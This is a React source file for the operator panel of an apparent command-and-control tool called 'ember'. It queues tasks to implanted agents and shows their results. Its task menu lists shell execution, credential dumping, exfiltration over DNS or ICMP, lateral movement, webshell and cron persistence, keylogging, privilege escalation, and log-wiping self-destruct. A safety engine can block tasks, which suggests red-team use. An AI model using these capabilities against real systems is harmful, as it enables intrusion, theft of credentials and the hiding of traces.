// @ts-nocheck
import { useState, useMemo } from "react";
import { trpc } from "@/lib/trpc";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { toast } from "sonner";
import {
  Terminal, FileText, FolderSearch, Upload, Shield, Key,
  ArrowRightLeft, Camera, Keyboard, Syringe, Trash2,
  Play, Loader2, Clock, CheckCircle2, XCircle, AlertTriangle,
  ChevronDown, ChevronUp, RefreshCw, Zap, Send, Eye,
} from "lucide-react";

// ─── Task Type Definitions ──────────────────────────────────────────────────
const TASK_TYPES = [
  { value: "shell_exec", label: "Shell Command", icon: Terminal, description: "Execute a shell command on the target", color: "text-blue-400",
    fields: [{ name: "cmd", label: "Command", type: "text", placeholder: "whoami", required: true }] },
  { value: "recon", label: "System Recon", icon: FolderSearch, description: "Gather system info, users, network, processes", color: "text-emerald-400",
    fields: [{ name: "scope", label: "Scope", type: "select", options: ["full", "network", "users", "processes", "services"], required: false }] },
  { value: "file_ops", label: "File Operations", icon: FileText, description: "Read, write, or list files on target", color: "text-amber-400",
    fields: [
      { name: "action", label: "Action", type: "select", options: ["read", "write", "list", "delete"], required: true },
      { name: "path", label: "File Path", type: "text", placeholder: "/etc/passwd", required: true },
      { name: "content", label: "Content (write only)", type: "textarea", placeholder: "File content...", required: false },
    ] },
  { value: "exfil", label: "Exfiltrate", icon: Upload, description: "Exfiltrate data from target to C2", color: "text-red-400",
    fields: [
      { name: "path", label: "Source Path", type: "text", placeholder: "/tmp/loot.zip", required: true },
      { name: "method", label: "Method", type: "select", options: ["http", "dns", "icmp"], required: false },
    ] },
  { value: "cred_dump", label: "Credential Dump", icon: Key, description: "Dump credentials from target system", color: "text-purple-400",
    fields: [{ name: "target", label: "Target", type: "select", options: ["memory", "files", "registry", "browser", "ssh_keys"], required: false }] },
  { value: "lateral_move", label: "Lateral Movement", icon: ArrowRightLeft, description: "Move laterally to adjacent systems", color: "text-cyan-400",
    fields: [
      { name: "target_ip", label: "Target IP", type: "text", placeholder: "192.168.1.100", required: true },
      { name: "method", label: "Method", type: "select", options: ["ssh", "smb", "wmi", "psexec", "rdp"], required: false },
    ] },
  { value: "persist", label: "Persistence", icon: Shield, description: "Establish persistence mechanism", color: "text-orange-400",
    fields: [{ name: "method", label: "Method", type: "select", options: ["cron", "service", "registry", "startup", "webshell"], required: false }] },
  { value: "screenshot", label: "Screenshot", icon: Camera, description: "Capture screen on target", color: "text-pink-400", fields: [] },
  { value: "keylog", label: "Keylogger", icon: Keyboard, description: "Start/stop keylogger on target", color: "text-yellow-400",
    fields: [{ name: "action", label: "Action", type: "select", options: ["start", "stop", "dump"], required: true }] },
  { value: "privesc", label: "Privilege Escalation", icon: Zap, description: "Attempt privilege escalation", color: "text-rose-400",
    fields: [{ name: "method", label: "Method", type: "select", options: ["auto", "suid", "kernel", "sudo", "service"], required: false }] },
  { value: "self_destruct", label: "Self-Destruct", icon: Trash2, description: "Remove agent and clean traces", color: "text-zinc-400",
    fields: [{ name: "clean_logs", label: "Clean Logs", type: "select", options: ["yes", "no"], required: false }] },
];

const STATUS_CONFIG: Record<string, { color: string; bg: string; icon: any }> = {
  pending: { color: "text-amber-400", bg: "bg-amber-500/10", icon: Clock },
  sent: { color: "text-blue-400", bg: "bg-blue-500/10", icon: Send },
  running: { color: "text-cyan-400", bg: "bg-cyan-500/10", icon: Loader2 },
  success: { color: "text-emerald-400", bg: "bg-emerald-500/10", icon: CheckCircle2 },
  failed: { color: "text-red-400", bg: "bg-red-500/10", icon: XCircle },
  timeout: { color: "text-orange-400", bg: "bg-orange-500/10", icon: AlertTriangle },
  blocked: { color: "text-rose-400", bg: "bg-rose-500/10", icon: Shield },
  partial: { color: "text-yellow-400", bg: "bg-yellow-500/10", icon: AlertTriangle },
};

// ─── Task Queue Dialog ──────────────────────────────────────────────────────
function TaskQueueDialog({ agentId, agentName }: { agentId: string; agentName: string }) {
  const [open, setOpen] = useState(false);
  const [taskType, setTaskType] = useState("shell_exec");
  const [params, setParams] = useState<Record<string, string>>({});
  const [priority, setPriority] = useState(5);
  const [requiresElevation, setRequiresElevation] = useState(false);

  const queueTask = trpc.ember.queueTask.useMutation({
    onSuccess: (data) => {
      if (data.blocked) {
        toast.warning(`Task blocked by safety engine: ${data.error}`);
      } else if (data.success) {
        toast.success(`Task queued: ${data.taskId}`);
        setOpen(false);
        setParams({});
      } else {
        toast.error(`Failed: ${data.error}`);
      }
    },
    onError: (err) => toast.error(`Error: ${err.message}`),
  });

  const selectedType = TASK_TYPES.find((t) => t.value === taskType)!;
  const Icon = selectedType.icon;

  function handleSubmit() {
    const cleanParams: Record<string, any> = {};
    for (const [k, v] of Object.entries(params)) {
      if (v && v.trim()) cleanParams[k] = v.trim();
    }
    queueTask.mutate({
      agentId,
      type: taskType,
      params: cleanParams,
      priority,
      requiresElevation,
    });
  }

  return (
    <Dialog open={open} onOpenChange={setOpen}>
      <DialogTrigger asChild>
        <Button variant="outline" size="sm" className="text-xs gap-1.5 border-amber-500/30 text-amber-400 hover:bg-amber-500/10">
          <Terminal className="h-3 w-3" /> Task
        </Button>
      </DialogTrigger>
      <DialogContent className="max-w-lg">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Terminal className="h-4 w-4 text-amber-400" />
            Queue Task — {agentName}
          </DialogTitle>
          <DialogDescription>
            Send a task to agent <code className="text-xs bg-zinc-800 px-1 rounded">{agentId}</code>
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-4">
          {/* Task Type Selector */}
          <div>
            <Label className="text-xs">Task Type</Label>
            <Select value={taskType} onValueChange={(v) => { setTaskType(v); setParams({}); }}>
              <SelectTrigger className="mt-1">
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                {TASK_TYPES.map((t) => (
                  <SelectItem key={t.value} value={t.value}>
                    <span className="flex items-center gap-2">
                      <t.icon className={`h-3.5 w-3.5 ${t.color}`} />
                      {t.label}
                    </span>
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            <p className="text-[10px] text-muted-foreground mt-1">{selectedType.description}</p>
          </div>

          {/* Dynamic Fields */}
          {selectedType.fields.map((field) => (
            <div key={field.name}>
              <Label className="text-xs">{field.label} {field.required && <span className="text-red-400">*</span>}</Label>
              {field.type === "text" && (
                <Input
                  className="mt-1 text-sm"
                  placeholder={field.placeholder}
                  value={params[field.name] || ""}
                  onChange={(e) => setParams({ ...params, [field.name]: e.target.value })}
                />
              )}
              {field.type === "textarea" && (
                <Textarea
                  className="mt-1 text-sm"
                  placeholder={field.placeholder}
                  rows={3}
                  value={params[field.name] || ""}
                  onChange={(e) => setParams({ ...params, [field.name]: e.target.value })}
                />
              )}
              {field.type === "select" && (
                <Select value={params[field.name] || ""} onValueChange={(v) => setParams({ ...params, [field.name]: v })}>
                  <SelectTrigger className="mt-1">
                    <SelectValue placeholder={`Select ${field.label.toLowerCase()}`} />
                  </SelectTrigger>
                  <SelectContent>
                    {field.options?.map((opt) => (
                      <SelectItem key={opt} value={opt}>{opt}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              )}
            </div>
          ))}

          {/* Priority & Elevation */}
          <div className="grid grid-cols-2 gap-3">
            <div>
              <Label className="text-xs">Priority (1-10)</Label>
              <Input
                type="number"
                min={1}
                max={10}
                className="mt-1"
                value={priority}
                onChange={(e) => setPriority(Number(e.target.value))}
              />
            </div>
            <div className="flex items-end">
              <label className="flex items-center gap-2 text-xs cursor-pointer">
                <input
                  type="checkbox"
                  checked={requiresElevation}
                  onChange={(e) => setRequiresElevation(e.target.checked)}
                  className="rounded border-zinc-600"
                />
                Requires Elevation
              </label>
            </div>
          </div>
        </div>

        <DialogFooter>
          <Button variant="outline" onClick={() => setOpen(false)}>Cancel</Button>
          <Button
            onClick={handleSubmit}
            disabled={queueTask.isPending}
            className="bg-amber-600 hover:bg-amber-700 text-white"
          >
            {queueTask.isPending ? <Loader2 className="h-3.5 w-3.5 animate-spin mr-1.5" /> : <Play className="h-3.5 w-3.5 mr-1.5" />}
            Queue Task
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}

// ─── Task Results Viewer ────────────────────────────────────────────────────
function TaskResultsPanel({ agentId, agentName }: { agentId: string; agentName: string }) {
  const [open, setOpen] = useState(false);
  const [expandedTask, setExpandedTask] = useState<string | null>(null);

  const tasks = trpc.ember.getAgentTasks.useQuery(
    { agentId, limit: 50 },
    { enabled: open, refetchInterval: open ? 5000 : false },
  );

  const taskList = tasks.data || [];

  return (
    <Dialog open={open} onOpenChange={setOpen}>
      <DialogTrigger asChild>
        <Button variant="ghost" size="sm" className="text-xs gap-1 text-muted-foreground hover:text-foreground">
          <Eye className="h-3 w-3" /> Tasks
        </Button>
      </DialogTrigger>
      <DialogContent className="max-w-2xl max-h-[80vh] overflow-hidden flex flex-col">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Terminal className="h-4 w-4 text-amber-400" />
            Task History — {agentName}
          </DialogTitle>
          <DialogDescription>
            {taskList.length} tasks for <code className="text-xs bg-zinc-800 px-1 rounded">{agentId}</code>
          </DialogDescription>
        </DialogHeader>

        <div className="flex-1 overflow-y-auto space-y-2 pr-1">
          {tasks.isLoading ? (
            <div className="flex items-center justify-center py-8">
              <Loader2 className="h-5 w-5 animate-spin text-muted-foreground" />
            </div>
          ) : taskList.length === 0 ? (
            <div className="text-center py-8 text-sm text-muted-foreground">
              No tasks queued for this agent
            </div>
          ) : (
            taskList.map((task) => {
              const statusCfg = STATUS_CONFIG[task.status] || STATUS_CONFIG.pending;
              const StatusIcon = statusCfg.icon;
              const taskTypeCfg = TASK_TYPES.find((t) => t.value === task.type);
              const TaskIcon = taskTypeCfg?.icon || Terminal;
              const isExpanded = expandedTask === task.taskId;

              return (
                <Card
                  key={task.taskId}
                  className={`border-zinc-700/50 cursor-pointer transition-colors hover:border-zinc-600/50`}
                  onClick={() => setExpandedTask(isExpanded ? null : task.taskId)}
                >
                  <CardContent className="p-3">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2 min-w-0">
                        <TaskIcon className={`h-3.5 w-3.5 flex-shrink-0 ${taskTypeCfg?.color || "text-zinc-400"}`} />
                        <div className="min-w-0">
                          <div className="flex items-center gap-2">
                            <span className="text-xs font-medium">{taskTypeCfg?.label || task.type}</span>
                            <Badge className={`text-[9px] ${statusCfg.bg} ${statusCfg.color} border-0`}>
                              <StatusIcon className={`h-2.5 w-2.5 mr-0.5 ${task.status === "running" ? "animate-spin" : ""}`} />
                              {task.status}
                            </Badge>
                            {task.safetyAllowed === 0 && (
                              <Badge className="text-[9px] bg-rose-500/20 text-rose-300 border-0">
                                <Shield className="h-2.5 w-2.5 mr-0.5" /> Blocked
                              </Badge>
                            )}
                          </div>
                          <p className="text-[10px] text-muted-foreground truncate">
                            {task.taskId} — {task.createdAt ? new Date(task.createdAt).toLocaleString() : "N/A"}
                          </p>
                        </div>
                      </div>
                      <div className="flex items-center gap-2 flex-shrink-0">
                        {task.durationMs != null && (
                          <span className="text-[10px] text-muted-foreground">{task.durationMs}ms</span>
                        )}
                        {isExpanded ? <ChevronUp className="h-3 w-3" /> : <ChevronDown className="h-3 w-3" />}
                      </div>
                    </div>

                    {isExpanded && (
                      <div className="mt-3 space-y-2 border-t border-zinc-700/50 pt-2">
                        {/* Params */}
                        {task.params && Object.keys(task.params as any).length > 0 && (
                          <div>
                            <p className="text-[10px] font-semibold text-muted-foreground mb-1">Parameters</p>
                            <pre className="text-[11px] bg-zinc-900/50 rounded p-2 overflow-x-auto">
                              {JSON.stringify(task.params, null, 2)}
                            </pre>
                          </div>
                        )}
                        {/* Output */}
                        {task.output && (
                          <div>
                            <p className="text-[10px] font-semibold text-emerald-400 mb-1">Output</p>
                            <pre className="text-[11px] bg-zinc-900/50 rounded p-2 overflow-x-auto max-h-48 overflow-y-auto whitespace-pre-wrap">
                              {task.output}
                            </pre>
                          </div>
                        )}
                        {/* Error */}
                        {task.error && (
                          <div>
                            <p className="text-[10px] font-semibold text-red-400 mb-1">Error</p>
                            <pre className="text-[11px] bg-red-950/30 rounded p-2 overflow-x-auto">
                              {task.error}
                            </pre>
                          </div>
                        )}
                        {/* Safety */}
                        {task.safetyReason && (
                          <div>
                            <p className="text-[10px] font-semibold text-rose-400 mb-1">Safety Assessment</p>
                            <p className="text-[11px] text-muted-foreground">
                              Risk: {task.safetyRiskScore}/100 — {task.safetyReason}
                            </p>
                          </div>
                        )}
                        {/* Meta */}
                        <div className="flex flex-wrap gap-3 text-[10px] text-muted-foreground">
                          <span>Priority: {task.priority}</span>
                          <span>Timeout: {task.timeoutSeconds}s</span>
                          {task.requiresElevation === 1 && <span className="text-amber-400">Elevated</span>}
                          {task.assignedBy && <span>By: {task.assignedBy}</span>}
                          {task.sentAt && <span>Sent: {new Date(task.sentAt).toLocaleTimeString()}</span>}
                          {task.completedAt && <span>Done: {new Date(task.completedAt).toLocaleTimeString()}</span>}
                        </div>
                      </div>
                    )}
                  </CardContent>
                </Card>
              );
            })
          )}
        </div>
      </DialogContent>
    </Dialog>
  );
}

// ─── Export Combined Component ───────────────────────────────────────────────
export { TaskQueueDialog, TaskResultsPanel };
export default TaskQueueDialog;
